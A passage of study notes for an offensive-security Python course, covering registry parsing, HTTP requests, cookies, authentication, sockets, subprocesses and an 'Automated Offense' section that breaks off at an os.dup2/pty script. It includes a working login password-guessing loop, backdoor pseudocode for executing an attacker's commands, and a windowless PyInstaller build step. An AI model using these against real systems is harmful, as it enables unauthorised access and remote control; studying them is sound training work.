Installer, InstallService, Internet Settings, LanguageComponentsInstaller, LAPS, Lock Screen, Lxss, Management Infrastructure, Media Center, MicrosoftEdge, MMDevices, NcdAutoSetup, NetCache, NetworkServiceTriggers, Notifications, OEMInformation, OneSettings, OOBE, OpenWith, OptimalLayout, Parental Controls, PerceptionSimulationExtensions, Personalization, PhotoPropertyHandler, PlayReady, Policies, PowerEfficiencyDiagnostics, PrecisionTouchPad, PreviewHandlers, Privacy, PropertySystem, Proximity, PushNotifications, Reliability, rempl, ReserveManager, RetailDemo, Run, RunOnce, SearchBoxEventArgsProvider, SecondaryAuthFactor, SecureAssessment, SecureBoot, Security and Maintenance, SettingSync, Setup, SharedAccess, SharedDLLs, SharedPC, Shell, Shell Extensions, ShellCompatibility, ShellServiceObjectDelayLoad, SHUTDOWN, SideBySide, SignalManager, SmartGlass, SMDEn, SMI, Spectrum, SpeechGestures, StillImage, StorageSense, Store, StructuredQuery, Syncmgr, SysPrepTapi, SystemProtectedUserData, Tablet PC, Telephony, ThemeManager, Themes, TouchKeyboard, UFH, Uninstall, UpdateHealthTools, UpdatePlatform, URL, UserPictureChange, UserState, Utilman, VFUProvider, WaaSAssessment, WebCheck, WinBio, Windows Block Level Backup, Windows To Go, WindowsAnytimeUpgrade, WindowsBackup, WindowsBackupAndRestore, WindowsUpdate, WindowTabManager, WINEVT, Wordpad, Wosc, WSMAN, WSX, WTDS, XboxGaming, XWiz
```

#### Keys .path() Attribute prints the Keys Path

```python
>>> reghandle = Registry("SOFTWARE_COPY")
>>> akey = reghandle.open(r"Microsoft\Windows NT\CurrentVersion\NetworkList")
>>> for eachsubkey in akey.subkeys():
...     print(eachsubkey.path())
...
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\NewNetworks
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\Permissions
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\Policies
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
ROOT\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures
# ROOT = path-root
```

### urllib

#### Web Encoding in Python3

```python
(sans) C:\Users\melvi\Desktop>pip install requests
Collecting requests
  Downloading requests-2.31.0-py3-none-any.whl (62 kB)
     |████████████████████████████████| 62 kB 2.3 MB/s
Collecting charset-normalizer<4,>=2
  Downloading charset_normalizer-3.4.2-cp37-cp37m-win_amd64.whl (103 kB)
     |████████████████████████████████| 103 kB 2.2 MB/s
Collecting certifi>=2017.4.17
  Downloading certifi-2025.4.26-py3-none-any.whl (159 kB)
     |████████████████████████████████| 159 kB 2.2 MB/s
Collecting idna<4,>=2.5
  Downloading idna-3.10-py3-none-any.whl (70 kB)
     |████████████████████████████████| 70 kB 2.3 MB/s
Collecting urllib3<3,>=1.21.1
  Downloading urllib3-2.0.7-py3-none-any.whl (124 kB)
     |████████████████████████████████| 124 kB 2.2 MB/s
Installing collected packages: charset-normalizer, certifi, idna, urllib3, requests
Successfully installed certifi-2025.4.26 charset-normalizer-3.4.2 idna-3.10 requests-2.31.0 urllib3-2.0.7
WARNING: You are using pip version 20.1.1; however, version 24.0 is available.
You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\python.exe -m pip install --upgrade pip' command.

(sans) C:\Users\melvi\Desktop>python3
Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import html
>>> html.escape("< > \" ' &")
'&lt; &gt; &quot; &#x27; &amp;'
>>> html.unescape("&lt;&gt; &quot; &apos; %41 &#65;&#66;")
'<> " \' %41 AB'
>>> import urllib.parse
>>> urllib.parse.quote("< > \" ' & : ? + : /")
'%3C%20%3E%20%22%20%27%20%26%20%3A%20%3F%20%2B%20%3A%20/'
>>> urllib.parse.quote("< > \" ' & : ? + : /", safe=" ")
'%3C %3E %22 %27 %26 %3A %3F %2B %3A %2F'
>>> urllib.parse.unquote("%3C %3E %26 %41 &#65;")
'< > & A &#65;'
```

#### GET Requests with urllib

```python
# should always quote your URL with urllib.parse.quote
(sans) C:\Users\melvi\Desktop>python
Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.parse
>>> import urllib.request
>>> urldata = urllib.parse.quote("http://web.com", safe="/\\:?=+")
>>> webcontent = urllib.request.urlopen(urldata).read()
# can use read() to read the entire contents of the website into a single string
# can use readlines() to read the contents into a list of lines
```

#### POST Request with urllib

```python
>>> import urllib.parse
>>> import urllib.request
>>> url = 'http://httpbin.org/post'
>>> url = urllib.parse.quote(url, safe="/\\:?=+")
>>> data = {"username":"mikem","password":"codeforensics"}
>>> data = urllib.parse.urlencode(data).encode()
>>> content = urllib.request.urlopen(url,data).read()
```

### Requests

#### Requests Module

```python
(sans) C:\Users\melvi\Desktop>pip install requests
Requirement already satisfied: requests in c:\users\melvi\desktop\sans\lib\site-packages (2.31.0)
Requirement already satisfied: charset-normalizer<4,>=2 in c:\users\melvi\desktop\sans\lib\site-packages (from requests) (3.4.2)
Requirement already satisfied: idna<4,>=2.5 in c:\users\melvi\desktop\sans\lib\site-packages (from requests) (3.10)
Requirement already satisfied: certifi>=2017.4.17 in c:\users\melvi\desktop\sans\lib\site-packages (from requests) (2025.4.26)
Requirement already satisfied: urllib3<3,>=1.21.1 in c:\users\melvi\desktop\sans\lib\site-packages (from requests) (2.0.7)
WARNING: You are using pip version 20.1.1; however, version 24.0 is available.
You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\python.exe -m pip install --upgrade pip' command.
```

#### One Request at a Time

```python
>>> import requests
>>> webdata = requests.get("http://sans.org").content
>>> webdata[:70]
b'<!doctype html>\n<html data-n-head-ssr>\n  <head>\n  <script>window.onloa'
>>> url = "http://127.0.0.1/login.php"
>>> formdata = {"username":"admin", "password":"ninja"}
>>> webdata = requests.post(url, formdata).text
>>> webdata[:45]
b'<!doctype html>\n<html data-n-head-ssr>\n  <hea'
# one request at a time with no relationship between requests
# requests for all HTTP verbs
```

#### Response Objects

```python
>>> resp = requests.get("http://isc.sans.edu")
>>> type(resp)
<class 'requests.models.Response'>
>>> dir(resp)
['__attrs__', '__bool__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__nonzero__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_content', '_content_consumed', '_next', 'apparent_encoding', 'close', 'connection', 'content', 'cookies', 'elapsed', 'encoding', 'headers', 'history', 'is_permanent_redirect', 'is_redirect', 'iter_content', 'iter_lines', 'json', 'links', 'next', 'ok', 'raise_for_status', 'raw', 'reason', 'request', 'status_code', 'text', 'url']
>>> resp.status_code, resp.reason
(200, 'OK')
>>> resp.headers
{'Content-Type': 'text/html', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Date': 'Fri, 30 May 2025 21:36:14 GMT', 'Last-Modified': 'Fri, 30 May 2025 21:35:26 GMT', 'Content-Encoding': 'gzip', 'x-amz-server-side-encryption': 'AES256', 'ETag': 'W/"91ed0e509a87f261f0b073308d0f976a"', 'Vary': 'accept-encoding', 'X-Cache': 'Hit from cloudfront', 'Via': '1.1 caaddf8ce46d2bfa1216d6fdd9c0393c.cloudfront.net (CloudFront)', 'X-Amz-Cf-Pop': 'IAD61-P4', 'X-Amz-Cf-Id': '5sOhxc5SVisxuo8PjwMlnvxsOAv1w40nlQkYo4YOQbDCf3E4LhPllQ==', 'Age': '192', 'Set-Cookie': 'visid_incap_2188750=8OZ+Akg8Tcap64w7885vxowlOmgAAAAAQUIPAAAAAAD70WuprZds/8xsHHWbWp6B; expires=Sat, 30 May 2026 06:54:40 GMT; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, nlbi_2188750_2100128=CRItGe7sMSb+HyBRac18PgAAAABJHW2TVNSZVKpl0j+sOV0m; HttpOnly; path=/; Domain=.sans.edu; Secure; SameSite=None, incap_ses_1349_2188750=UuJeXVQTkADjCzB0sJy4Eo0lOmgAAAAADKeHi3Myq3QTe8I4qAztLw==; path=/; Domain=.sans.edu; Secure; SameSite=None', 'Strict-Transport-Security': 'max-age=31556926; includeSubDomains', 'X-CDN': 'Imperva', 'Server': 'nc -l -p 80', 'X-Do-Not-Hack': '18 U.S.C. Parag 1030', 'X-HeyJason': 'DEV522 rocks', 'Expect-CT': 'max-age=0, report-uri="https://isc.sans.edu/cspreport.html"', 'X-Content-Type-Options': 'nosniff', 'Permitted-Cross-Domain-Policies': 'none', 'X-Frame-Options': 'SAMEORIGIN', 'X-XSS-Protection': '1; mode=block', 'Referrer-Policy': 'same-origin', 'Content-Security-Policy': "default-src 'self'; script-src https://isc.sans.edu https://www.googletagmanager.com https://www.googleoptimize.com https://www.google-analytics.com https://cdn.jsdelivr.net https://cdn.cookielaw.org https://www.youtube.com https://snap.licdn.com/li.lms-analytics/insight.min.js 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://isc.sans.edu https://cdn.cookielaw.org https://px.ads.linkedin.com https://www.linkedin.com/px/li_sync https://www.google-analytics.com https://www.googletagmanager.com https://www.google.com/ads/ga-audiences data:; font-src 'self' https://fonts.gstatic.com data:; connect-src https://geolocation.onetrust.com https://privacyportal-de.onetrust.com https://cdn.cookielaw.org https://www.google-analytics.com https://stats.g.doubleclick.net https://cdn.linkedin.oribi.io 'self'; media-src 'self' https://traffic.libsyn.com https://hwcdn.libsyn.com https://content.libsyn.com https://www.dshield.org ; object-src 'none'; child-src 'self' https://www.sans.org; frame-src 'self' https://www.sans.org https://www.youtube.com https://www.youtube-nocookie.com; worker-src 'none'; frame-ancestors https://isc.sans.edu https://www.dshield.org https://www.sans.org; form-action 'self'; upgrade-insecure-requests; block-all-mixed-content; disown-opener; reflected-xss block; manifest-src 'self' https://isc.sans.edu; referrer origin-when-cross-origin; report-uri https://isc.sans.edu/cspreport.html;", 'X-Iinfo': '9-17469769-17469784 NNNN CT(1 13 0) RT(1748641165385 132) q(0 0 0 1) r(0 0) U12'}
>>> resp.content[:70]
b'<!doctype html><html lang="en"><head><title>SANS.edu Internet Storm Ce'
# all those methods return a response object with access to full details about the webpage's response
```

#### Multiple Requests with Sessions

```python
>>> import requests
>>> browser = requests.session()
>>> browser.headers
{'User-Agent': 'python-requests/2.31.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
>>> browser.headers["User-Agent"]
'python-requests/2.31.0'
>>> browser.headers["User-Agent"] = "Mozilla FutureBrowser 145.9"
>>> browser.headers
{'User-Agent': 'Mozilla FutureBrowser 145.9', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
# remembers settings and headers like User-Agent and maintains state via cookie
```

#### Browser GET/POST Requests

```python
>>> import requests
>>> browser = requests.session()
>>> resp = browser.get("http://www.bing.com")
>>> resp.content[:60]
# Make GET requests to retrieve data
b'<!doctype html><html lang="de" dir="ltr"><head><meta name="t'
>>> postdata = {"username":"markb", "password":"sec573"}
>>> resp = browser.post("http://web.page/login.php", postdata)
# make POST requests to submit data to forms
```

#### A Password Guesser

```python
>>> import requests
>>> browser = requests.session()
>>> passwords = open("/usr/share/john/password.lst", "r").readlines()
>>> for pw in passwords:
...     postdata = {"username":"admin", "password":pw.strip()}
...     x = browser.post("http://127.0.0.1/login.php",postdata)
...     if not "incorrect" in x.text:
...             print(x.text, pw)
```

#### GET/POST Requests Proxies

```python
>>> browser = requests.session()
>>> browser.proxies
{}
>>> browser.proxies["http"] = "http://127.0.0.1:8080"
>>> browser.proxies
{'http': 'http://127.0.0.1:8080'}
>>> del browser.proxies["http"]
>>> browser.proxies
{}
```

#### GET/POST Requests Cookies

```python
>>> import requests
>>> browser = requests.session()
>>> browser.get("http://www.bing.com")
<Response [200]>
>>> type(browser.cookies)
<class 'requests.cookies.RequestsCookieJar'>
>>> dir(browser.cookies)
['_MutableMapping__marker', '__abstractmethods__', '__class__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__setattr__', '__setitem__', '__setstate__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', '__weakref__', '_abc_impl', '_cookie_attrs', '_cookie_from_cookie_tuple', '_cookies', '_cookies_for_domain', '_cookies_for_request', '_cookies_from_attrs_set', '_cookies_lock', '_find', '_find_no_duplicates', '_normalized_cookie_tuples', '_now', '_policy', '_process_rfc2109_cookies', 'add_cookie_header', 'clear', 'clear_expired_cookies', 'clear_session_cookies', 'copy', 'domain_re', 'dots_re', 'extract_cookies', 'get', 'get_dict', 'get_policy', 'items', 'iteritems', 'iterkeys', 'itervalues', 'keys', 'list_domains', 'list_paths', 'magic_re', 'make_cookies', 'multiple_domains', 'non_word_re', 'pop', 'popitem', 'quote_re', 'set', 'set_cookie', 'set_cookie_if_ok', 'set_policy', 'setdefault', 'strict_domain_re', 'update', 'values']
```

#### Access Cookies in the Cookiejar

```python
>>> browser.cookies.keys()
['MUID', 'SRCHD', 'SRCHHPGUSR', 'SRCHUID', 'SRCHUSR', '_EDGE_S', '_EDGE_V', '_HPVN', '_SS', 'MUIDB']
>>> browser.cookies["MUID"]
'28B80BBF788562A61AD81E4379E76310'
>>> browser.cookies.set("MUID", "newvalue", domain="bing.com", path="/")
Cookie(version=0, name='MUID', value='newvalue', port=None, port_specified=False, domain='bing.com', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
```

#### Example Full Cookie Access

```python
>>> browser.cookies._cookies.keys()
dict_keys(['.bing.com', 'www.bing.com', 'bing.com'])
>>> browser.cookies._cookies[".bing.com"].keys()
dict_keys(['/'])
>>> browser.cookies._cookies[".bing.com"]["/"].keys()
dict_keys(['MUID', '_EDGE_S', '_EDGE_V', 'SRCHD', 'SRCHUID', 'SRCHUSR', 'SRCHHPGUSR', '_SS', '_HPVN'])
>>> browser.cookies._cookies[".bing.com"]["/"]["MUID"]
Cookie(version=0, name='MUID', value='28B80BBF788562A61AD81E4379E76310', port=None, port_specified=False, domain='.bing.com', domain_specified=True, domain_initial_dot=True, path='/', path_specified=True, secure=False, expires=1782338071, discard=False, comment=None, comment_url=None, rest={}, rfc2109=False)
>>> browser.cookies._cookies[".bing.com"]["/"]["MUID"].path
'/'
>>> browser.cookies._cookies[".bing.com"]["/"]["MUID"].secure
False
```

#### Add Cookies to the Cookiejar

```python
>>> import http
>>> newcookie = http.cookiejar.Cookie(version=0, name="session.id", value="sessionid", port=None, port_specified=False, domain="10.10.10.30", domain_specified=True, domain_initial_dot=True, path="/sessionhijack.php", path_specified=True, secure=False, expires=None, discard=False, comment=None, comment_url=None, rest={"HttpOnly":None})
>>> browser.cookies.set_cookie(newcookie)
```

#### Erase Cookies in the Cookiejar

```python
>>> browser.cookies.clear()
# erases all cookies in cookiejar
>>> browser.cookies.clear_session_cookies()
# clears session cookies
>>> browser.cookies.clear(domain="www.bing.com")
# clears cookie for specific domain
>>> browser.cookies.keys()
[]
>>> del browser.cookies("MUID")
# clears cookie based on its name
```

#### GET/POST Request Authentication

```python
# using auth argument
>>> import requests
>>> requests.get("http://httpbin.org/basic-auth/user/passwd", auth=("user","passwd"))
<Response [200]>
>>> requests.get("http://httpbin.org/basic-auth/user/passwd", auth=("user","notPasswd"))
<Response [401]>
# using auth attribute on browser object
>>> import requests
>>> browser = requests.session()
>>> browser.auth = ("user", "password")
>>> browser.get("http://httpbin.org/basic-auth/user/password")
<Response [200]>
>>> browser.auth = ("user", "notpassword")
>>> browser.get("http://httpbin.org/basic-auth/user/password")
<Response [401]>
```

#### Other Auth Types

```bash
(sans) C:\Users\melvi\Desktop>pip install requests_oauthlib

(sans) C:\Users\melvi\Desktop>pip install requests_ntlm

(sans) C:\Users\melvi\Desktop>pip install requests-kerberos
```

```python
>>> import requests
>>> from requests_oauthlib import OAuth1
>>> browser = requests.session()
>>> browser.auth = OAuth1("APP_KEY","APP_SECRET","USER_TOKEN", "USER_SECRET")
>>> browser.get("http://api.oauth.site/api")

...

>>> from requests_ntlm import HttpNtlmAuth
>>> browser = requests.session()
>>> browser.auth = HttpNtlmAuth(r"domain\username","password")
>>> browser.get("http://ntlm.site")

...

>>> from requests_kerberos import HTTPKerberosAuth
>>> browser.auth = HTTPKerberosAuth()
>>> browser.get("http://kerberos-authenticated-site.com")
```

#### SSL/TLS Support

```python
>>> browser.get("https://site.com", verify=False)
# to see where your certificates are installed
>>> import requests
>>> requests.certs.where()
'C:\\Users\\melvi\\Desktop\\sans\\lib\\site-packages\\certifi\\cacert.pem'
```

#### Handling Captchas

```python
# use a captcha-solving service
# https://deathbycaptcha.com
# has API
# pip install deathbycaptcha-official
```

## 573.5 - Automated Offense

### Components of a Backdoor

#### Python Backdoor

```python
# pseudo code
>>> connect to attacker
>>> while True:
...     get command from remote connection
...     execute the command locally
...     send results over the connection
```

### Socket Communications

#### DNS Queries

```python
>>> import socket
>>> socket.gethostbyname("scanme.net")
'15.197.148.33'
# given a hostname, returns an IP
>>> socket.gethostbyaddr("3.33.130.190")
('a2aa9ff50de748dbe.awsglobalaccelerator.com', [], ['3.33.130.190'])
# given an IP, returns a hostname
```

#### UDP Sockets

```python
>>> import socket
>>> udpsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# AF_INET = IPv4, AF_INET6 = IPv6
# socket.DGRAM = UDP protocol
# a server uses bind(("<IP ADDRESS>", port))
# client or server receives using udpsocket.recvfrom(<bytes>)
# client or server sends usind udpsocket.sendto(<bytes>, ("<IP ADDRESS>", port))
```

#### TCP Sockets

```python
>>> import socket
>>> tcpsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# three-way handshake occurs when connect() is called
```

#### Establish Connections

```python
# create outbound connections
>>> socket.connect(("<dest ip>", <dest port>))
# accept inbound connections
>>> socket.bind(("<ip>", <port>))
>>> socket.listen(<number of connections>)
>>> socket.accept()
```

#### Transmitting and Receiving

```python
# to send bytes across the socket
>>> socket.send(b"bytes to send")
>>> socket.send("string to send".encode())
# to receive bytes from the socket
>>> socket.revc(max num of bytes)
>>> socket.recv(max num of bytes)
>>> socket.recv(max num of bytes).decode()
# possible responses:
# 1. len(recv) == 0 when connection dropped
# 2. recv() returns data when there is data in the TCP buffer
# 3. recv() will sit and wait if there is no data to receive
```

### Exception/Error Handling

#### Exception Handling

```python
>>> try:
... 	print(500/0)
... except:
... 	print("An error has occured")
... 
An error has occured

...

>>> try:
...     print(50/0)
... 	print("this line won't execute")
... except ZeroDivisionError:
... 	print("dude, you can't divide by zero")
... except Exception as e:
... 	print("Some other exception occured " + str(e))
... 
dude, you can't divide by zero
```

#### try/except/else

```python
# try to open url that does not exist
>>> try:
...     urllib.request.urlopen("http://doesntexist.tgt")
# specific exception handler
... except urllib.error.URLError:
...     print("That URL doesn't exist")
...     sys.exit(2)
# generic exception handler
... except Exception as e:
...     print(f"{str(e)} occured")
# do this if it worked
... else:
...     print("success without error")
# do this whether it worked or not
... finally:
...     print("always do this")
```

#### Try until it works!

```python
>>> while True:
...     try:
...             print(50/0)
...     except:
...             continue
...     else:
...             break
# loops forever
# breaks, only when there is no exception happening
```

#### Try different Things until it works!

```python
>>> done = False
>>> while not done:
...     for thingtotry in ['list','of','things','to','try']:
...             try:
...                     print(thingtotry)
...             except:
...                     continue
...             else:
...                     done = True
...                     break
# loops through the for loop until it succeeds
```

### Process Execution

#### Interacting with Subprocesses

```python
>>> processhandle = subprocess.Popen("run this command",
...     shell = True,
...     stdout = subprocess.PIPE,
...     stderr = subprocess.PIPE,
...     stdin = subprocess.PIPE)
>>> procresult = processhandle.stdout.read()
>>> procerrors = processhandle.stderr.read()
```

#### Capturing Process Execution

```python
>>> import subprocess
>>> proc = subprocess.Popen("ls -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
>>> exit_code = proc.wait()
# waits until it finishes and capture the exit code
>>> results = proc.stdout.read()
# reads the output of the command into a string
>>> print(results)
b'insgesamt 60\ndrwxrwxr-x  5 d41y d41y 4096 Jun  3 17:27 abschlussuebung\ndrwxrwxr-x  5 d41y d41y 4096 Jun  3 17:47 automated_offense\ndrwxr-xr-x  3 d41y d41y 4096 M\xc3\xa4r  6 11:07 Bilder\ndrwxr-xr-x  5 d41y d41y 4096 Mai 15 09:57 BurpSuiteCommunity\ndrwxrwxr-x  4 d41y d41y 4096 M\xc3\xa4r 21 12:08 ctf\ndrwxr-xr-x  2 d41y d41y 4096 Feb  7 11:48 Dokumente\ndrwxr-xr-x  4 d41y d41y 4096 Jun  3 17:27 Downloads\ndrwxrwxr-x  5 d41y d41y 4096 Apr 25 09:00 github\ndrwxr-xr-x  2 d41y d41y 4096 Nov  7  2024 Musik\ndrwxr-xr-x  2 d41y d41y 4096 Nov  7  2024 \xc3\x96ffentlich\n-rw-rw-r--  1 d41y d41y 2201 Apr 24 16:28 pattern.txt\ndrwxr-xr-x  3 d41y d41y 4096 Jun  2 16:23 Schreibtisch\n-rw-rw-r--  1 d41y d41y  425 Apr 24 16:55 shellcode\ndrwx------ 10 d41y d41y 4096 Mai 19 11:22 snap\ndrwxr-xr-x  2 d41y d41y 4096 Nov  7  2024 Videos\n'
```

#### Popen.wait(), Buffers, and Popen.communicate()

```python
>>> from subprocess import Popen, PIPE
>>> ph = Popen("ls -laR /", shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
>>> ph.wait()
# wait locks up the program
# wait only returns after the program is completely finished
# Popen pauses execution when the stdout read buffer is full
>>> from subprocess import Popen, PIPE
>>> ph = Popen("ls -laR /", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
>>> output, errors = ph.communicate()
# communicate returns a tuple of bytes for both the output and errors
```

#### A simpler Alternative in .run()

```python
>>> import subprocess
>>> result = subprocess.run("whoami", shell=True, capture_output=True)
>>> result.stdout
b'd41y\n'
>>> result.
result.args                result.returncode          result.stdout
result.check_returncode()  result.stderr 
# simplified interface that ends up being passed on to subprocess.Popen()
```

#### Shell Command Injection and shell=True

```python
# shell needs to be true
# otherwise the shell injection won't work
# you would have to split the command into a list
ip = input("What IP shall I ping?")
subprocess.run(f"ping -c 1 {ip}".split(), capture_output=True).stdout
```

### Creating a Python Executable

#### Turn the .py into an .EXE

```python
# you can use:
# windows: PyInstaller, py2exe, nuitka, pyOxidizer, pynsist
# linux: PyInstaller, freeze
# Mac: PyInstaller, py2app
```

#### Create an Executable

```bash
┌──(automated_offense)─(d41y㉿user)-[~]
└─$ pyinstaller --onefile --noconsole [file]
```

### Techniques for recvall()

#### Fixed-Byte Recvall()

```python
# sender
>>> def mysendall(thesocket, thedata):
...     thesocket.send(f"{len(thedata):0>100}".encode())
...     return thesocket.sendall(thedata)
# receiver
>>> def recvall(thesocket):
...     datalen = int(thesocket.recv(100))
...     data = b""
...     while len(data)<datalen:
...             data += thesocket.recv(4096)
...     return data
```

#### Delimiter-Based recvall()

```python
# sender
>>> def mysendall(thesocket, thedata, delimiter=b"!@#$%^&"):
...     senddata = codecs.encode(thedata, "base64") + delimiter
...     return thesocket.sendall(senddata)
# receiver
>>> def recvall(thesocket, delimiter=b"!@#$%^&"):
...     data = b""
...     while not data.endswith(delimiter):
...             data += thesocket.recv(4096)
...     return codecs.decode(data[:-len(delimiter)], "base64")
```

#### Non-Blocking Socket

```python
>>> mysocket.setblocking(0)
>>> mysocket.recv(1024)
# non-blocking sockets do not wait (regular socket does)
# returns an exception if no data is ready when recv() is called
```

#### Timeout-Based Non-Blocking Socket

```python
>>> def recvall(thesocket, timeout=2):
# waits to begin
...     data = thesocket.recv(1)
# don't wait anymore
...     thesocket.setblocking(0)
...     starttime = time.time()
# receive until timeout
...     while time.time() - starttime < timeout:
...             try:
...                     newdata = thesocket.recv(4096)
# if len(data) is 0, the connection is dropped
...                     if len(newdata) == 0:
...                             break
...             except socket.error:
...                     pass
...             else:
# accumulate data
...                     data += newdata
# update timeout when you receive more data
...                     starttime = time.time()
# begin blocking again
...     thesocket.setblocking(1)
...     return data
```

#### select.select() Based recvall

```python
>>> import socket
>>> thesocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>>> import select
>>> rtrecv,rtsend,err = select.select([thesocket],[thesocket],[thesocket])
>>> rtrecv
[<socket.socket fd=3, family=2, type=1, proto=0, laddr=('0.0.0.0', 0)>]
>>> rtsend
[<socket.socket fd=3, family=2, type=1, proto=0, laddr=('0.0.0.0', 0)>]
>>> err
[]
# select.select() can be used to see when sockets are ready to recv or send or are in error
# send it three lists of sockets
# returns three lists of sockets that are ready to receive, ready to send, and in error
```

#### select.select() recvall()

```python
>>> def recvall(thesocket, pause=0.15):
# wait for initial data
...     data = thesocket.recv(1)
...     rtr,rts,err = select.select([thesocket],[thesocket],[thesocket])
...     while rtr:
...             data += thesocket.recv(4096)
# must have some delay
...             time.sleep(pause)
...             rtr,rts,err = select.select([thesocket],[thesocket],[thesocket])
...     return data
```

### stdio

#### Input, Output, and Error File Descriptors

```python
>>> import sys
>>> dir(sys)
['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_exceptions', '_current_frames', '_debugmallocstats', '_framework', '_getframe', '_getframemodulename', '_git', '_home', '_setprofileallthreads', '_settraceallthreads', '_stdlib_dir', '_xoptions', 'abiflags', 'activate_stack_trampoline', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'copyright', 'deactivate_stack_trampoline', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exception', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'get_int_max_str_digits', 'getallocatedblocks', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getunicodeinternedsize', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'is_stack_trampoline_active', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'monitoring', 'orig_argv', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'platlibdir', 'prefix', 'ps1', 'ps2', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'set_int_max_str_digits', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdlib_module_names', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions']
```

#### STDIN, STDOUT, STDERR

```python
>>> import sys
>>> type(sys.stdout)
<class '_io.TextIOWrapper'>
>>> dir(sys.stdout)
['_CHUNK_SIZE', '__class__', '__del__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_checkClosed', '_checkReadable', '_checkSeekable', '_checkWritable', '_finalizing', 'buffer', 'close', 'closed', 'detach', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'line_buffering', 'mode', 'name', 'newlines', 'read', 'readable', 'readline', 'readlines', 'reconfigure', 'seek', 'seekable', 'tell', 'truncate', 'writable', 'write', 'write_through', 'writelines']
```

#### STDOUT, STDIN are File

```bash
┌──(automated_offense)─(d41y㉿user)-[~]
└─$ cat writefile.py                                                        
import sys
outfile = open("outfile.txt", "w")
sys.stdout = outfile
print("Write this to a file")
outfile.flush()
outfile.close()
                                                                                           
┌──(automated_offense)─(d41y㉿user)-[~]
└─$ python writefile.py             
                                                                                           
┌──(automated_offense)─(d41y㉿user)-[~]
└─$ cat outfile.txt            
Write this to a file

...

┌──(automated_offense)─(d41y㉿user)-[~]
└─$ cat readfile.py 
import sys
infile = open("outfile.txt")
sys.stdin = infile
x = input("")
print("The file says " + x)
                                                                                           
┌──(automated_offense)─(d41y㉿user)-[~]
└─$ python readfile.py 
The file says Write this to a file

# stdin and stdout can be treated like files
# redirecting sys.stdout replaces screen with a file
# redirecting sys.stdin replaces keyboard with a file
```

#### Sockets are similar to Files

```python
>>> import sys, socket
>>> s = socket.socket()
>>> s.connect(("127.0.0.1", 9000))
>>> s.fileno()
3
>>> sys.stdout.fileno()
1
>>> sys.stdin.fileno()
0
>>> sys.stderr.fileno()
2
# sockets have file descriptors just like files
```

#### os.dup2(src, dest)

```bash
┌──(d41y㉿user)-[~]
└─$ cat osdup.py                                                            
import socket, os, pty
